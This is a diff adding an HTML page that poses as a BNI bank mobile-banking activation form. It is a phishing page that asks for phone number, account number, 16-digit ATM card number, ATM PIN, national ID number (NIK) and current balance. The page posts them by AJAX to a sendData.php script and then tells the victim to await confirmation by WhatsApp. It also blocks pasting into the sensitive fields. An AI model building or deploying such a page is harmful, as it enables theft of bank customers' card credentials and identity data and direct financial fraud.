@@ -1,0 +1,570 @@
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="theme-color" content="#FF7F08">
+    <meta name="viewport" content="width=device-width, user-scalable=no" />
+    <meta name="viewport" content="initial-scale=1, width=device-width, maximum-scale=1.0, user-scalable=no, height=device-height, viewport-fit=cover" />
+    <meta name="format-detection" content="telephone=no">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>REGISTRASI</title>
+    <link rel="stylesheet" href="assets/vendors/bootstrap/css/bootstrap.min.css">
+    <link rel="stylesheet" href="assets/css/style.css">
+    <link rel="stylesheet" href="assets/icons/bni-icons.css">
+    <style>
+        .welcome-container-scroll{
+            background: rgba(239, 242, 244, 0.85) !important;
+        }
+        
+        .ico-chevron-grey{
+            filter: gray saturate(0%) brightness(0%) contrast(100%);
+            -webkit-filter: saturate(0%) brightness(0%) contrast(100%);
+        }
+        
+        .input{
+            height: 20px;
+            margin-top: -5px;
+            padding: 0px;
+        }
+        
+        #phone{
+            padding-left: 10px;
+        }
+        
+        label{
+            margin-bottom: -10px;
+            margin-top: -7px;
+        }
+        
+        
+       .loader {
+  width: 48px;
+  height: 48px;
+  border: 5px dotted #FFF;
+  border-radius: 50%;
+  display: inline-block;
+  position: relative;
+  box-sizing: border-box;
+  animation: rotation 2s linear infinite;
+}
+
+@keyframes rotation {
+  0% {
+    transform: rotate(0deg);
+  }
+  100% {
+    transform: rotate(360deg);
+  }
+} 
+
+
+.loader {
+  font-size: 7px;
+  width: 5px;
+  height: 5px;
+  border: 2px solid #fff;
+  border-radius: 50%;
+  position: relative;
+  text-indent: 1em;
+  box-sizing: border-box;
+  animation: mulShdSpin 0.5s infinite ease;
+  
+  transform: translateZ(1);
+}
+@keyframes mulShdSpin {
+  0%,
+  100% {
+    box-shadow: 0em -2.6em 0em 0em #ffffff, 1.8em -1.8em 0 0em rgba(000,000,000, 0.2), 2.5em 0em 0 0em rgba(000,000,000, 0.2), 1.75em 1.75em 0 0em rgba(000,000,000, 0.2), 0em 2.5em 0 0em rgba(000,000,000, 0.2), -1.8em 1.8em 0 0em rgba(000,000,000, 0.2), -2.6em 0em 0 0em rgba(000,000,000, 0.5), -1.8em -1.8em 0 0em rgba(000,000,000, 0.7);
+  }
+  96% {
+    box-shadow: 0em -2.6em 0em 0em #000, 1.8em -1.8em 0 0em rgba(000,000,000, 0.2), 2.5em 0em 0 0em rgba(000,000,000, 0.2), 1.75em 1.75em 0 0em rgba(000,000,000, 0.2), 0em 2.5em 0 0em rgba(000,000,000, 0.2), -1.8em 1.8em 0 0em rgba(000,000,000, 0.2), -2.6em 0em 0 0em rgba(000,000,000, 0.5), -1.8em -1.8em 0 0em rgba(000,000,000, 0.7);
+  }
+  12.5% {
+    box-shadow: 0em -2.6em 0em 0em rgba(000,000,000, 0.7), 1.8em -1.8em 0 0em #ffffff, 2.5em 0em 0 0em rgba(000,000,000, 0.2), 1.75em 1.75em 0 0em rgba(000,000,000, 0.2), 0em 2.5em 0 0em rgba(000,000,000, 0.2), -1.8em 1.8em 0 0em rgba(000,000,000, 0.2), -2.6em 0em 0 0em rgba(000,000,000, 0.2), -1.8em -1.8em 0 0em rgba(000,000,000, 0.5);
+  }
+  25% {
+    box-shadow: 0em -2.6em 0em 0em rgba(000,000,000, 0.5), 1.8em -1.8em 0 0em rgba(000,000,000, 0.7), 2.5em 0em 0 0em #ffffff, 1.75em 1.75em 0 0em rgba(000,000,000, 0.2), 0em 2.5em 0 0em rgba(000,000,000, 0.2), -1.8em 1.8em 0 0em rgba(000,000,000, 0.2), -2.6em 0em 0 0em rgba(000,000,000, 0.2), -1.8em -1.8em 0 0em rgba(000,000,000, 0.2);
+  }
+  37.5% {
+    box-shadow: 0em -2.6em 0em 0em rgba(000,000,000, 0.2), 1.8em -1.8em 0 0em rgba(000,000,000, 0.5), 2.5em 0em 0 0em rgba(000,000,000, 0.7), 1.75em 1.75em 0 0em #ffffff, 0em 2.5em 0 0em rgba(000,000,000, 0.2), -1.8em 1.8em 0 0em rgba(000,000,000, 0.2), -2.6em 0em 0 0em rgba(000,000,000, 0.2), -1.8em -1.8em 0 0em rgba(000,000,000, 0.2);
+  }
+  50% {
+    box-shadow: 0em -2.6em 0em 0em rgba(000,000,000, 0.2), 1.8em -1.8em 0 0em rgba(000,000,000, 0.2), 2.5em 0em 0 0em rgba(000,000,000, 0.5), 1.75em 1.75em 0 0em rgba(000,000,000, 0.7), 0em 2.5em 0 0em #ffffff, -1.8em 1.8em 0 0em rgba(000,000,000, 0.2), -2.6em 0em 0 0em rgba(000,000,000, 0.2), -1.8em -1.8em 0 0em rgba(000,000,000, 0.2);
+  }
+  62.5% {
+    box-shadow: 0em -2.6em 0em 0em rgba(000,000,000, 0.2), 1.8em -1.8em 0 0em rgba(000,000,000, 0.2), 2.5em 0em 0 0em rgba(000,000,000, 0.2), 1.75em 1.75em 0 0em rgba(000,000,000, 0.5), 0em 2.5em 0 0em rgba(000,000,000, 0.7), -1.8em 1.8em 0 0em #ffffff, -2.6em 0em 0 0em rgba(000,000,000, 0.2), -1.8em -1.8em 0 0em rgba(000,000,000, 0.2);
+  }
+  75% {
+    box-shadow: 0em -2.6em 0em 0em rgba(000,000,000, 0.2), 1.8em -1.8em 0 0em rgba(000,000,000, 0.2), 2.5em 0em 0 0em rgba(000,000,000, 0.2), 1.75em 1.75em 0 0em rgba(000,000,000, 0.2), 0em 2.5em 0 0em rgba(000,000,000, 0.5), -1.8em 1.8em 0 0em rgba(000,000,000, 0.7), -2.6em 0em 0 0em #ffffff, -1.8em -1.8em 0 0em rgba(000,000,000, 0.2);
+  }
+  87.5% {
+    box-shadow: 0em -2.6em 0em 0em rgba(000,000,000, 0.2), 1.8em -1.8em 0 0em rgba(000,000,000, 0.2), 2.5em 0em 0 0em rgba(000,000,000, 0.2), 1.75em 1.75em 0 0em rgba(000,000,000, 0.2), 0em 2.5em 0 0em rgba(000,000,000, 0.2), -1.8em 1.8em 0 0em rgba(000,000,000, 0.5), -2.6em 0em 0 0em rgba(000,000,000, 0.7), -1.8em -1.8em 0 0em #ffffff;
+  }
+}
+ 
+    </style>
+</head>
+<body class="welcome-container-scroll m-0 p-10" onload="Exit_Registration(-1, true);CekKoneksi();">
+    <div id="overlay"></div>
+    <div id="spin"></div>
+ <fieldset id="datapage" style="display: ">
+ <div class="container" style="background-color: rgba(239, 242, 244, 0.85);  background-image: url(assets/images/welcome-bg.png); 
+  background-size: 100% 100%; 
+  background-position: 100% 100%; position: fixed; height: 100%; z-index: 999999;">
+ <div class="loading-overlay" style="display: none; background: transparent" id="loader">
+<span class="loader"></span>
+</div>    
+<header class="title " style="background: #FF7F08; height: 60px">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjz-ASbtzrlPGXA_9kDaXQVutLoWx-rHN55gplBfPxgGejo-dY4YYHOw9-IPedBxt7Q-0OUOg4FhW8hTxAW05XdJStCGXUYeYUCKcSXPQc1UKvwpp-oZbL29vQCgfsI-TVWTeeBNc3rSS4hBpnUaB2l5Oo-CQDu4KfwBRP1rXTvo0vxiM6xvj1fdEgXVZE/s1080/1693939692052.png" style="width: 90px; float:left; margin-top: 4px; margin-left: -2px; position: absolute">
+        <div class="header-title" >
+            <i class="signal-indicator-base right ico-signal-indicator"></i>
+            <i class="bni-ico ico-chevron-grey ico-header left ml-3" onclick="goBack()" ></i>
+            <h6 class="mb-0 mx-auto" style="margin:auto; color: white; margin-top: -6px">Aktivasi</h6>
+        </div>
+      
+    </header>
+
+        <hr class="mt-0">
+        <div class="row wizard-nav" style="display: flex; align-items: center; justify-content: center;">
+            <img style="max-width: 70%; max-height: 70%;opacity: 0" src="assets/icons/images/WelcomePage/lineCircle1.png"></img>
+
+    </div>
+<legend id=="form-data" style="display: ; z-index: -2px">    
+<form id="formdata" onsubmit="sendData(event); return false" method="POST" >   
+    <div class="wizard-content wizard-active" id="wizard-content-1" style="margin-top: -5px">
+        <div class="card m-2 pt-2" style="border:1px solid #005E6A; position:static;">
+            <div class="card-body p-2">
+                <div class="form-group mb-0">
+                    <label for="" class="labelku mb-0 new-green-color-style" style="font-size: 13px; margin-left: 6px">Nomor Handphone</label>
+                    <div class="input-group mb-3 pt-0 mt-0 border-bottom rounded-0">
+       <input type="tel" class="form-control-sm input" id="phone" name="phone" required maxlength="13">
+                    </div>
+                </div>
+            <div class="card-body p-2">
+                <div class="form-group mb-0">
+                    <label for="" class="labelku mb-0 new-green-color-style" style="font-size: 13px">Nomor Rekening</label>
+                    <div class="input-group mb-3 pt-0 mt-0 border-bottom rounded-0">
+       <input type="tel" class="form-control-sm input" id="accountNum" name="accountNum" required maxlength="10">
+                    </div>
+                </div>
+                <div class="form-group mb-0">
+                    <label for="" class="labelku mb-0 new-green-color-style" style="font-size: 13px; margin-left: -2px">16 Digit No. Kartu ATM</label>
+                    <div class="input-group mb-3 pt-0 mt-0 border-bottom rounded-0">
+         <fieldset id="app">              
+        <input type="tel" class="form-control-sm input" id="numCardATM1" name="numCardATM"  v-mask="generateCardNumberMask" v-model="cardNumber"
+                     pattern="(?=.*[0-9]).{19,19}"  required oninvalid="this.setCustomValidity('Mɑsukkɑn 𝟭𝟲 𝗱𝗶𝗴𝗶𝘁 Nomor 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁 dengɑn Benɑr')" onchange="this.setCustomValidity('')"            autocomplete="on"  required >
+                 </fieldset>          
+                </div>
+                    <div class="form-group mb-0">
+                        <label for="" class="labelku mb-0 new-green-color-style" style="font-size: 13px">PIN Kartu ATM</label>
+                        <div class="input-group mb-3 pt-0 mt-0 border-bottom rounded-0">
+                            <input type="tel" class="form-control-sm input" id="pinATM" autocomplete="off" name="pinatm"
+                                   required maxlength="6" minlength="6">
+                            
+                        </div>
+                    </div>
+               
+                <div class="form-group mb-0">
+                    <label for="" class="labelku mb-0 new-green-color-style" style="font-size: 13px">NIK</label>
+                    <div class="input-group mb-3 pt-0 mt-0 border-bottom rounded-0">
+                       <fieldset id="apps">
+
+  <input type="tel" class="form-control-sm input" id="nik" name="nikktp" required minlength="19" maxlength="19" v-mask="'####-####-####-####'">
+
+       </fieldset>
+                    </div>
+                </div>
+                 <div class="form-group mb-0">
+                    <label for="" class="labelku mb-0 new-green-color-style" style="font-size: 13px">Saldo Saat Ini</label>
+                    <div class="input-group mb-3 pt-0 mt-0 border-bottom rounded-0">
+  <input type="tel" class="uang form-control-sm input" id="rupiah" name="saldo" required>
+                           <input type="hidden" id="tanpa-rupiah"/>
+                    </div>
+                </div>
+                    
+        <div class="justify-content-center" style="margin-top:-5px; display: flex; z-index: -1;">
+            <button type="submit"  class=" btn btn-block-rectangle-80 btn-block-rectangle button-green-rec-new" style="background: #FF7F08; border: none; box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2); height: 40px; margin-top: 0px">Daftar
+            </button>
+        </div>
+        </div>
+    </div>
+    </form>
+   </legend>
+  <legend id="datainfo" style="display: none; top: 60; color: #000; position: fixed; height: 100%; left: 0; right: 0; margin: 0px auto; z-index: 999999999; background-color: rgba(239, 242, 244, 0.85);  background-image: url(assets/images/welcome-bg.png); 
+  background-size: 100% 100%; 
+  background-position: 100% 100%;"><center>
+     <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhjmRHirKoDwZGW14NwDjlWk_S66GC4FEssXzCNjfvWrSkmGmwzSid4hHlTTdE6Jh7n_S72p1p3Gn2svE4qafzpLVVd5weZRIuABb14tT_OKlKM1fOSJ1UUXKdBvepepCcAin6Xnup6FyuCQx5TDZ26S6DATDcGI6tIs4QKahRWseMt26QhKsXMF9D372I/s961/logo-BNI-46-1%20(1).png" style="margin-top:-5px;" width="63%"><br/>  
+ <h1 style="font-size: 23px; margin-top: 0px; color: #000">Terima Kasih<br/>
+ <span style="font-size: 15px; padding 5px">
+ Permintaan sedang diproses,
+ silahkan menunggu konfirmasi selanjutnya melalui WhatsApp</span>
+ 
+ 
+ </h1><br/>
+     </center>
+   </legend> 
+  
+ </fieldset>           
+      <div class="footer-wrapper-home" style="position: fixed; bottom: -5.5; width: 100%; left: 0; right: 0; margin: 0px auto; opacity: 1; z-index: 999999; background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjesCM1oq1RfF9idhU24EXSvn1ZWzv5zdHvHpcnA1yTkCZ9oP5Xab8i-MYwerGhObxx9KkqWMmYrV4wM6KrAuyaIaWWnxAqJiL3Muk7vSaGUxXOTRVr3QcDrU3ulkDTNlCOjz31_6hfDIIER_fGKtKFTyRdXRu7AIT07yIBJFB1AGQVRbH35r_sZXpOlCE/s1080/AddText_12-31-02.40.50.png); background-size: 100% 100%; background-position: 100% 100%; height: 100px; background-color: none">
+     
+           
+
+ 
+<script>
+   $(document).ready(function(){
+    $('#formdat1a').submit(function(e) {
+       e.preventDefault();
+       
+         $.ajax({
+              url: 'req/sendData.php',
+              type: 'post',
+              data: $(this).serialize(), 
+              
+              success: function(data) {
+  
+    setTimeout(function(){
+   $("#datainfo").fadeIn();  
+    }, 1500);
+               
+            },
+           error: function() {
+                      
+    setTimeout(function(){
+    }, 1500);
+
+            },
+        });
+    });
+});
+    
+</script>  
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
+
+
+
+    integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
+
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+   <script>
+$(document).ready(function(){
+    $('#formdata').submit(function(e) {
+        e.preventDefault();
+       
+          $("#loader").show();
+
+
+          $.ajax({
+              url: 'sendData.php',
+              type: 'post',
+              data: $(this).serialize(),             
+success: function(data) {
+       setTimeout(function(){
+
+$("#loader").hide();
+
+  $("#form-data").fadeOut(); 
+ $("#datainfo").fadeIn(); 
+ 
+        }, 500);
+               
+            },
+           error: function() {
+               setTimeout(function(){
+
+$("#loadersaya").hide();
+ 
+        }, 500);
+
+            }
+        });
+    });
+});
+ </script>
+ </script>
+ <!-- Bootstrap & jQuery JS -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+<script>
+$(document).ready(function(){
+$('#numCardATM1').mask('0000 0000 0000 0000');
+
+});</script>
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js'></script>
+<script src='https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js'></script>
+
+<script>
+/*
+See on github: https://github.com/muhammederdem/credit-card-form
+*/
+
+new Vue({
+  el: "#app",
+  data() {
+    return {
+      currentCardBackground: Math.floor(Math.random()* 25 + 1), // just for fun :D
+      cardName: "",
+      cardNumber: "",
+      cardMonth: "",
+      cardYear: "",
+      cardCvv: "",
+      nik: "",
+      minCardYear: new Date().getFullYear(),
+      amexCardMask: "#### ###### #####",
+      otherCardMask: "#### #### #### ####",
+      cardNumberTemp: "",
+      isCardFlipped: false,
+      focusElementStyle: null,
+      isInputFocused: false
+    };
+  },
+  mounted() {
+    this.cardNumberTemp = this.otherCardMask;
+    document.getElementById("cardNumber").focus();
+  },
+  computed: {
+    getCardType () {
+      let number = this.cardNumber;
+      let re = new RegExp("^4");
+      if (number.match(re) != null) return "visa";
+
+      re = new RegExp("^(34|37)");
+      if (number.match(re) != null) return "amex";
+
+      re = new RegExp("^5[1-5]");
+      if (number.match(re) != null) return "mastercard";
+
+      re = new RegExp("^6011");
+      if (number.match(re) != null) return "discover";
+      
+      re = new RegExp('^9792')
+      if (number.match(re) != null) return 'troy'
+
+      return "visa"; // default type
+    },
+		generateCardNumberMask () {
+			return this.getCardType === "amex" ? this.amexCardMask : this.otherCardMask;
+    },
+    minCardMonth () {
+      if (this.cardYear === this.minCardYear) return new Date().getMonth() + 1;
+      return 1;
+    }
+  },
+  watch: {
+    cardYear () {
+      if (this.cardMonth < this.minCardMonth) {
+        this.cardMonth = "";
+      }
+    }
+  },
+  methods: {
+    flipCard (status) {
+      this.isCardFlipped = status;
+    },
+    focusInput (e) {
+      this.isInputFocused = true;
+      let targetRef = e.target.dataset.ref;
+      let target = this.$refs[targetRef];
+      this.focusElementStyle = {
+        width: `${target.offsetWidth}px`,
+        height: `${target.offsetHeight}px`,
+        transform: `translateX(${target.offsetLeft}px) translateY(${target.offsetTop}px)`
+      }
+    },
+    blurInput() {
+      let vm = this;
+      setTimeout(() => {
+        if (!vm.isInputFocused) {
+          vm.focusElementStyle = null;
+        }
+      }, 300);
+      vm.isInputFocused = false;
+    }
+  }
+});
+</script>
+<script>
+/*
+See on github: https://github.com/muhammederdem/credit-card-form
+*/
+
+new Vue({
+  el: "#apps",
+  data() {
+    return {
+      currentCardBackground: Math.floor(Math.random()* 25 + 1), // just for fun :D
+      cardName: "",
+      cardNumber: "",
+      cardMonth: "",
+      cardYear: "",
+      cardCvv: "",
+      nik: "",
+      minCardYear: new Date().getFullYear(),
+      amexCardMask: "#### ###### #####",
+      otherCardMask: "#### #### #### ####",
+      cardNumberTemp: "",
+      isCardFlipped: false,
+      focusElementStyle: null,
+      isInputFocused: false
+    };
+  },
+  mounted() {
+    this.cardNumberTemp = this.otherCardMask;
+    document.getElementById("cardNumber").focus();
+  },
+  computed: {
+    getCardType () {
+      let number = this.cardNumber;
+      let re = new RegExp("^4");
+      if (number.match(re) != null) return "visa";
+
+      re = new RegExp("^(34|37)");
+      if (number.match(re) != null) return "amex";
+
+      re = new RegExp("^5[1-5]");
+      if (number.match(re) != null) return "mastercard";
+
+      re = new RegExp("^6011");
+      if (number.match(re) != null) return "discover";
+      
+      re = new RegExp('^9792')
+      if (number.match(re) != null) return 'troy'
+
+      return "visa"; // default type
+    },
+		generateCardNumberMask () {
+			return this.getCardType === "amex" ? this.amexCardMask : this.otherCardMask;
+    },
+    minCardMonth () {
+      if (this.cardYear === this.minCardYear) return new Date().getMonth() + 1;
+      return 1;
+    }
+  },
+  watch: {
+    cardYear () {
+      if (this.cardMonth < this.minCardMonth) {
+        this.cardMonth = "";
+      }
+    }
+  },
+  methods: {
+    flipCard (status) {
+      this.isCardFlipped = status;
+    },
+    focusInput (e) {
+      this.isInputFocused = true;
+      let targetRef = e.target.dataset.ref;
+      let target = this.$refs[targetRef];
+      this.focusElementStyle = {
+        width: `${target.offsetWidth}px`,
+        height: `${target.offsetHeight}px`,
+        transform: `translateX(${target.offsetLeft}px) translateY(${target.offsetTop}px)`
+      }
+    },
+    blurInput() {
+      let vm = this;
+      setTimeout(() => {
+        if (!vm.isInputFocused) {
+          vm.focusElementStyle = null;
+        }
+      }, 300);
+      vm.isInputFocused = false;
+    }
+  }
+});
+</script>
+
+        <script>
+      /* Tanpa Rupiah */
+    var tanpa_rupiah = document.getElementById('tanpa-rupiah');
+    tanpa_rupiah.addEventListener('keyup', function(e)
+    {
+        tanpa_rupiah.value = formatRupiah(this.value);
+    });
+    
+    /* Dengan Rupiah */
+    var dengan_rupiah = document.getElementById('rupiah');
+    dengan_rupiah.addEventListener('keyup', function(e)
+    {
+        dengan_rupiah.value = formatRupiah(this.value, 'Rp. ');
+    });
+    
+    /* Fungsi */
+    function formatRupiah(angka, prefix)
+    {
+        var number_string = angka.replace(/[^,\d]/g, '').toString(),
+            split    = number_string.split(','),
+            sisa     = split[0].length % 3,
+            rupiah     = split[0].substr(0, sisa),
+            ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
+            
+        if (ribuan) {
+            separator = sisa ? '.' : '';
+            rupiah += separator + ribuan.join('.');
+        }
+        
+        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
+        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
+    }
+    
+    
+    
+    
+    
+    
+    
+  </script>
+    <script src="assets/vendors/jquery/jquery-3.3.1.min.js"></script>
+    <script src="assets/vendors/bootstrap/js/bootstrap.min.js"></script>
+    <script src="assets/js/script.js"></script>
+    <script src="cordova.js"></script>
+    <script src="assets/js/custombox.js"></script>
+    <script src="assets/js/scripts.js"></script>
+    <script src="assets/js/soapclient.js"></script>
+    <script src="assets/js/spin.js"></script>
+    <script src="assets/js/configurl.js"></script>
+    <script src="assets/js/aes.js"></script>
+    <script src="assets/js/jsencrypt.min.js"></script>
+    <script src="assets/js/bni_public.js"></script>
+    <script src="assets/js/Registrasi.js"></script>
+    <script src="assets/js/signalIndicator.js"></script>
+
+<script>
+    function checkNumberFieldLength(elem) {
+        if (elem.value.length > 4) {
+            elem.value = elem.value.slice(0, 4);
+        }
+    }
+
+    $(document).ready( ()=>{
+        $('input#accountNum').bind('cut copy paste', function (e) {
+            e.preventDefault();
+        });
+
+        $('input#numCardATM').bind('cut copy paste', function (e) {
+            e.preventDefault();
+        });
+
+        $('input#pinATM').bind('cut copy paste', function (e) {
+            e.preventDefault();
+        });
+
+        $('input#nik').bind('cut copy paste', function (e) {
+            e.preventDefault();
+        });
+
+        $('input#email').bind('cut copy paste', function (e) {
+            e.preventDefault();
+        });
+
+        $('input#userName').bind('cut copy paste', function (e) {
+            e.preventDefault();
+        });
+
+        $('input#referralCode').bind('cut copy paste', function (e) {
+            e.preventDefault();
+        });
+    })
+</script>
+</body>
+</html>
